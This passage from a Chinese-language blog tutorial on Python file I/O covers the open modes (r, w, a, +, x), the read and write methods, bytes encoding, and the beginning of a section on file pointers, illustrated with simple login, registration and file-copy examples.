class="line">kinght:geekxk</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">username = input(<span class="string">&quot;请输入账号：&quot;</span>).strip()</span><br><span class="line">passwrod = input(<span class="string">&#x27;请输入密码：&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> users:</span><br><span class="line">    res = users.read()</span><br><span class="line">    uname,upasswd = res.split(<span class="string">&#x27;:&#x27;</span>) <span class="comment"># 解压赋值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> username == uname <span class="keyword">and</span> passwrod == upasswd:</span><br><span class="line">    print(<span class="string">&quot;登陆成功&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;账号或密码错误&quot;</span>)</span><br></pre></td></tr></table></figure><p>但绝大多数情况账号和密码都不是唯一的</p><p><strong>第二次修改</strong></p><p>修改user内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kinght:geekxk</span><br><span class="line">root:root</span><br><span class="line">abc:abc</span><br><span class="line">tom:jack</span><br></pre></td></tr></table></figure><p>注意，文件中每一行是存在换行符的<code>\n</code>，而且print也会再次复制换行符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> lin <span class="keyword">in</span> f:</span><br><span class="line">        print(lin)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201106102050031.png" alt="image-20201106102050031"></p><p>完整版修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">input_username = input(<span class="string">&quot;请输入账号：&quot;</span>).strip()</span><br><span class="line">input_passwd = input(<span class="string">&#x27;请输入密码：&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> lin <span class="keyword">in</span> f:</span><br><span class="line">        <span class="comment"># strip 是消除所有的空白字符(包括换行符)</span></span><br><span class="line">        username,password = lin.strip().split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username == input_username <span class="keyword">and</span> password == input_passwd:</span><br><span class="line">            print(<span class="string">&#x27;login successfull&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;username or password error&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="w模式-只写模式"><a href="#w模式-只写模式" class="headerlink" title="w模式(只写模式)"></a>w模式(只写模式)</h2><p>w模式用来创建全新的文件</p><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><p>当文件不存在的时候会生成一个空文件(未设置文件类型)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当文件不存在时，会生成文件</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;d&#x27;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ... <span class="comment"># python的占位符号</span></span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201106105601942.png" alt="image-20201106105601942"></p><p>当文件存在时候会清空文件(<strong>坚决杜绝W模式打开重要文件</strong>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当文件存在会清空文件，指针位于开始位置</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ... <span class="comment"># python的占位符号</span></span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201106105741706.png" alt="image-20201106105741706"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># f.read() # 只写模式不能读</span></span><br><span class="line">    f.write(<span class="string">&#x27;哈哈哈哈，我擦嘞\n干啥勒&#x27;</span>)</span><br><span class="line">    <span class="comment"># 在w模式下打开文件没有关闭的情况下，会让指针继续往后书写</span></span><br><span class="line">    f.write(<span class="string">&#x27;猜猜这是第几行&#x27;</span>) <span class="comment"># 并没有换行符</span></span><br><span class="line">    f.write(<span class="string">&#x27;再来一次&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201106110839204.png" alt="image-20201106110839204"></p><h3 id="文本文件的拷贝案例"><a href="#文本文件的拷贝案例" class="headerlink" title="文本文件的拷贝案例"></a>文本文件的拷贝案例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文本文件的copy工具</span></span><br><span class="line"></span><br><span class="line">input_file = input(<span class="string">&quot;请输入源文件路径&gt;&gt;&gt;:&quot;</span>)</span><br><span class="line">output_file = input(<span class="string">&#x27;请输入输出文件存放路径&gt;&gt;&gt;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不直接使用变量名而使用标准输出语法是因为可能会有windows系统使用本程序，需要处理反斜杠</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">r&#x27;&#123;&#125;&#x27;</span>.format(input_file),mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f1,\</span><br><span class="line">    open(<span class="string">r&#x27;&#123;&#125;&#x27;</span>.format(output_file),mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    <span class="comment"># f2.write(f1.read()) # 如果数据量太大会冲爆内存</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f1:</span><br><span class="line">        f2.write(line)</span><br></pre></td></tr></table></figure><h2 id="a模式-只追加写"><a href="#a模式-只追加写" class="headerlink" title="a模式(只追加写)"></a>a模式(只追加写)</h2><p>a模式用来在原有文件的基础上写入新的内容，比如记录日志，比如注册功能</p><h3 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h3><p>当文件不存在时,会创建空文档，文件指针再开头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当文件不存在时,会创建空文档</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;c&#x27;</span>,mode=<span class="string">&#x27;at&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201106112444579.png" alt="image-20201106112444579"></p><p>当文件存在时，文件指针会直接跳到末尾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当文件不存在时,会创建空文档</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;at&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;\n新写入的内容&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;\n在写一行&#x27;</span>)</span><br><span class="line"><span class="comment"># a模式，文件不会被清空，文件指针会直接跳到末尾</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;at&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;\n文件不会被清空&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201106113030431.png" alt="image-20201106113030431"></p><h3 id="注册案例"><a href="#注册案例" class="headerlink" title="注册案例"></a>注册案例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">inp_username = input(<span class="string">&#x27;请输入注册账号:&#x27;</span>)</span><br><span class="line">inp_passworld = input(<span class="string">&#x27;请输入密码:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;at&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> users,\</span><br><span class="line">    open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> xy_user:</span><br><span class="line">    <span class="comment"># 读取user内的值，并查找是否用相同用户名</span></span><br><span class="line">    <span class="keyword">for</span> xy <span class="keyword">in</span> xy_user:</span><br><span class="line">        username,passworld = xy.strip().split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username == inp_username:</span><br><span class="line">            print(<span class="string">&quot;账号已存在&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        users.write(<span class="string">&#x27;&#123;&#125;:&#123;&#125;\n&#x27;</span>.format(inp_username,inp_passworld))</span><br></pre></td></tr></table></figure><h2 id="模式"><a href="#模式" class="headerlink" title="+模式"></a>+模式</h2><p>+模式不能单独使用，必须配合r、w、a</p><p>案例假设 asdasd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kinght:abcd</span><br><span class="line">root:root</span><br><span class="line">abcd:123</span><br><span class="line">cda:we</span><br></pre></td></tr></table></figure><h3 id="r-模式"><a href="#r-模式" class="headerlink" title="r+模式"></a>r+模式</h3><p>可读可写，但是特性取决于r(即文件不存在则报错)，文件存在指针在最前面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;asdasd&#x27;</span>,mode=<span class="string">&#x27;rt+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;abc&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201106172344610.png" alt="image-20201106172344610"></p><p>kin被替换成了abc</p><h3 id="w-模式"><a href="#w-模式" class="headerlink" title="w+模式"></a>w+模式</h3><p>可读可写，但特性取决于w(即文件不存在创建文件)，文件指针在最前面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;asdasd&#x27;</span>,mode=<span class="string">&#x27;wt+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># w模式会清空文件</span></span><br><span class="line">    f.write(<span class="string">&#x27;abc&#x27;</span>) <span class="comment"># 写入文件后</span></span><br><span class="line">    <span class="comment"># write会让指针移到末尾，故.read直接读取都不到东西</span></span><br><span class="line">    <span class="comment"># .read读取文件是从当前文件指针位置到末尾</span></span><br><span class="line">    print(f.read())</span><br></pre></td></tr></table></figure><h3 id="a-模式"><a href="#a-模式" class="headerlink" title="a+模式"></a>a+模式</h3><p>可读可写，但特性取决于a(即文件不存在创建文本文件)，文件指针在最后面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;asdasd&#x27;</span>,mode=<span class="string">&#x27;at+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># a模式会让文件指针直接在最后</span></span><br><span class="line">    <span class="comment"># 故.read直接读取不到东西</span></span><br><span class="line">    print(f.read())</span><br></pre></td></tr></table></figure><h2 id="x模式"><a href="#x模式" class="headerlink" title="x模式"></a>x模式</h2><p>只写模式(了解即可)，文件不存在则生成文件，文件存在则报错，这个模式可以防止w的覆盖操作，不过完全可以加判断代替</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件存在则报错</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;a.txt&#x27;</span>,mode=<span class="string">&#x27;xt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">pass</span> <span class="comment"># pass 与 ... 作用相同</span></span><br><span class="line">    <span class="comment"># [Errno 17] File exists: &#x27;a.txt&#x27;</span></span><br><span class="line"><span class="comment"># 文件不存在则生成文件</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;b.txt&#x27;</span>,mode=<span class="string">&#x27;xt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;哈哈哈哈&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="操作文件的其他方法"><a href="#操作文件的其他方法" class="headerlink" title="操作文件的其他方法"></a>操作文件的其他方法</h1><h2 id="读操作"><a href="#读操作" class="headerlink" title="读操作"></a>读操作</h2><p>read和readlines由于都会一次性读取所有的文件内容，所以对于内存有一定溢出的危险</p><h3 id="f-read"><a href="#f-read" class="headerlink" title="f.read()"></a>f.read()</h3><p>读取所有内容,执行完该操作后，文件指针会移动到文件末尾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.read(<span class="number">3</span>)) <span class="comment"># 指定单次读取3字符(b模式是3个bytes数据)</span></span><br><span class="line">    print(f.read()) <span class="comment"># 读取完所有内容</span></span><br></pre></td></tr></table></figure><h3 id="f-readline"><a href="#f-readline" class="headerlink" title="f.readline()"></a>f.readline()</h3><p>读取一行内容,光标移动到第二行首部</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读操作</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 读取一行内容,光标移动到第二行首部</span></span><br><span class="line">    print(f.readline()) <span class="comment"># 你好呀!</span></span><br><span class="line">    print(f.readline()) <span class="comment"># helloworld</span></span><br><span class="line">    print(f.readline()) <span class="comment"># i&#x27;m fine thank you</span></span><br></pre></td></tr></table></figure><p><strong>while文件拷贝案例修改</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        line = f.readline()</span><br><span class="line">        <span class="keyword">if</span> len(line) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(line)</span><br></pre></td></tr></table></figure><h3 id="f-readlines"><a href="#f-readlines" class="headerlink" title="f.readlines()"></a>f.readlines()</h3><p>当前文件指针为起始，读取每一行内容，并且按行为分割，存放于列表中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.readlines())  <span class="comment"># [&#x27;helloworld\n&#x27;, &quot;i&#x27;m fine thank you\n&quot;]</span></span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201114003658511.png" alt="image-20201114003658511"></p><h2 id="写操作"><a href="#写操作" class="headerlink" title="写操作"></a>写操作</h2><h3 id="f-write"><a href="#f-write" class="headerlink" title="f.write"></a>f.write</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;111\n222\n333\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201118141858915.png" alt="image-20201118141858915"></p><h3 id="f-writelines"><a href="#f-writelines" class="headerlink" title="f.writelines"></a>f.writelines</h3><p>将列表循环写入到文件中</p><p><strong>方案一</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="string">&#x27;111\n&#x27;</span>,<span class="string">&#x27;222&#x27;</span>,<span class="string">&#x27;333&#x27;</span>]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> l:</span><br><span class="line">        f.write(line)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201118142730081.png" alt="image-20201118142730081"></p><p><strong>方案二</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="string">&#x27;444\n&#x27;</span>,<span class="string">&#x27;555&#x27;</span>,<span class="string">&#x27;666&#x27;</span>]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(l)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201118142823490.png" alt="image-20201118142823490"></p><h3 id="f-flush-不推荐执行，通常出现在测试场景"><a href="#f-flush-不推荐执行，通常出现在测试场景" class="headerlink" title="f.flush(不推荐执行，通常出现在测试场景)"></a>f.flush(不推荐执行，通常出现在测试场景)</h3><p>刷新，写入文件的时候为了减少I/O延迟，通常不是即使写入硬盘，而是先放于内存中，f.flush则是让计算机立即将前面的操作写入到硬盘中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;abcdefg&#x27;</span>)</span><br><span class="line">    f.flush()</span><br></pre></td></tr></table></figure><h3 id="其他的相关操作"><a href="#其他的相关操作" class="headerlink" title="其他的相关操作"></a>其他的相关操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">print(f.readable()) <span class="comment"># True 文件是否可读</span></span><br><span class="line">print(f.writable())  <span class="comment"># False 文件是否可写(这里是r模式,不可写)</span></span><br><span class="line">print(f.closed)  <span class="comment"># False 文件是否关闭</span></span><br><span class="line">print(f.encoding)  <span class="comment"># utf-8 文件编码格式(如果文件打开模式为b,则没有该属性)</span></span><br><span class="line">print(f.flush())  <span class="comment"># 立刻将文件内容从内存刷到硬盘</span></span><br><span class="line">print(f.name) <span class="comment"># 文件名</span></span><br></pre></td></tr></table></figure><h3 id="Bytes类型的使用"><a href="#Bytes类型的使用" class="headerlink" title="Bytes类型的使用"></a>Bytes类型的使用</h3><p><strong>t模式写入，要求列表内必须全部为字符串</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="string">&#x27;444&#x27;</span>,<span class="string">&#x27;555&#x27;</span>,<span class="string">&#x27;666&#x27;</span>,<span class="number">777</span>]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(l)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201118142949696.png" alt="image-20201118142949696"></p><p>我们知道，b模式需要编码才能写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">l = [</span><br><span class="line">    <span class="string">&#x27;44asd4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;55weq5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;66qwe6&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(l)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201118143609609.png" alt="image-20201118143609609"></p><p>编码后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">l = [</span><br><span class="line">    <span class="string">&#x27;44asd4&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;55weq5&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;66qwe6&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(l)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201118143552926.png" alt="image-20201118143552926"></p><p>如果是字符串中只有英文和数字，bytes类型的英文和数字只是在前方加了b</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">l = [</span><br><span class="line">    <span class="string">b&#x27;44asd4&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;55weq5&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;66qwe6&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(l)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201118144251766.png" alt="image-20201118144251766"></p><p>而有了中文，bytes则需要规定编码格式<code>encode(&#39;utf-8&#39;)</code>，实际上转换是调用bytes进行类型转换，规定格式utf-8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes(<span class="string">&#x27;上&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><p>将中文转换为bytes类型</p><hr><h1 id="控制文件指针操作"><a href="#控制文件指针操作" class="headerlink" title="控制文件指针操作"></a>控制文件指针操作</h1><p>前文提到过，我们写入和读取都会让文件指针移动，导致在同一文件句柄下无法重复读取和覆盖写入</p><p><strong>指针移动的单位都是以bytes/字节为单位</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.tell() <span class="comment"># 获取文件指针当前位置</span></span><br></pre></td></tr></table></figure><h2 id="f-seek-n-模式"><a href="#f-seek-n-模式" class="headerlink" 